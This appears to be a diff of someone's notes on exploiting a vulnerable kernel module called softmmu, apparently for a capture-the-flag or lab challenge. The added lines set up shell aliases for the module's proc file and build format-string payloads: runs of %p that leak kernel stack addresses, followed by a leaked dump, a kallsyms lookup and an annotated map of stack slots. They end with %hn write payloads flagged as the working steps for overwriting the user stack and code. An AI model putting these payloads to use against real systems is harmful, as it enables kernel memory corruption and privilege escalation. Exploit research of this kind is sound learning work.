@@ -436,12 +436,17 @@ Below is to modify that saved user stack value: (16th element)
 
 Maybe this is the user's ebp? And we could change that so we redirect into our shellcode where it could pick up a return value onto the shellcode
 
-Set virtual address
+Inspect kernel stack:
+=====================
+mkdir /tmp/m; cd /tmp/m; alias set='echo -ne $1 > /proc/softmmu' ; alias hd='hexdump -C /proc/softmmu' ; alias maps='cat /proc/self/maps'
+
+Set virtual address:
 set '\x00\xe0\x9b\xbf'
 
-Inspect kernel stack:
+Fill the stack:
 export FORMAT=$(for i in $(seq 1 20000); do echo -n "%p--"; done)
 
+Casino our way:
 for i in $(seq 1 500); do hd; done
 
 [  265.372483 ] p--c2ec7514--c2d84000--  (null)--c2d84001--  (null)--c2d84002--  (null)--c2d84003--  (null)--c2d84000--02d84067--c2d81ef0--c480f20b--c343f26c--c3b56104--c343f264--bf9be000--c326c000--c480f2a0--00000400--c2d81efc--c480f2be--00000400--c2d81f3c--c11af756--00000400--c2d81f28--  (null)--c2e9f780--c2e9f780--  (null)--b774a000--00000400--c326c000--  (null)--  (null)--c2e9f780--c35aa280--c11af5a0--c2d81f64--c11aa224--c2d81f98--c19a30c0--c2e9f7d0--00000400--b774a000--c35aa280--c11aa1c0--00000400--c2d81f8c--c1159929--c2d81f98--  (null)--  (null)--c11aa1c0--c3004470--c35aa280--  (null)--0000000c--c2d81fac--c1159a47--c2d81f98--00000004--  (null)--  (null)--082122a0--0000000c--c2d80000--c15f5ccd--  (null)--b774a000--00000400--082122a0--0000000c--09b21d44--00000003--0000007b--0000007b--  (null)--00000033--00000003--b774b424--00000073--00000246--bf9b7038--0000007b--  (null)--  (null)--c2d82280--c2ac9230--00100100--00200200--c2d82190--  (null)--  (null)--000001c9--c2d82340--c2ac92a8--00100100
@@ -449,8 +454,65 @@ for i in $(seq 1 500); do hd; done
 00000000  00 00 f6 01                                       |....|
 00000004
 
+cat /proc/kallsyms | grep softmmu
 
-export FORMAT=$(for i in $(seq 1 40000); do echo -n "v"; done)$(for i in $(seq 1 15); do echo -n "%p"; done)%hn
+export FORMAT=$(for i in $(seq 1 40000); do echo -n "v"; done)$(for i in $(seq 1 84); do echo -n "%p"; done)%hn
+
+Stack elements
+--------------
+
+1.  Not sure
+2.  PGD entry first byte addr
+3.  NULL
+4.  PGD entry second byte addr
+5.  NULL
+6.  PGD entry third byte addr
+7.  NULL
+8.  PGD entry fourth byte addr
+9.  NULL
+10. PGD entry first byte addr
+12. Pushed EBP to kernel stack 
+13. Return address(0xc480f20b) back to mmu_walk
+14. Kernel code address (c343f26c)
+15. Kernel code address (c3b56104)
+16. Kernel code address (c343f264)
+17. Our query virtual address (bf9be000) 
+18. Kernel code address (c326c000)
+19. Kernel code address (c480f2a0) - mmu_read [softmmu]
+20. 0x400 - some offset
+21. Kernel stack
+22. Kernel code address (c480f2be)
+23. 0x400 - some offset
+24. Kernel stack
+25. Kernel code address (c11af756)
+26. 0x400 - some offset
+27. Kernel stack
+28. NULL
+29. Kernel code c2e9f780
+30. Kernel code c2e9f780
+31. NULL
+32. VDSO area probably
+33. 0x400 - some offset
+34. Kernel code c326c000
+35. NULL
+36. NULL
+
+73. Userspace code
+85. Our userspace stack addr, probably some EBP
+
+
+This to write to our userspace stack:
+
+------------
+IMPORTANT!!!
+------------
+
+Change stack:
+export FORMAT=$(for i in $(seq 1 40000); do echo -n "v"; done)$(for i in $(seq 1 84); do echo -n "%p"; done)%hn
+Change code:
+export FORMAT=$(for i in $(seq 1 40000); do echo -n "v"; done)$(for i in $(seq 1 72); do echo -n "%p"; done)%hn
+
+
 
 
 ## New Idea!!
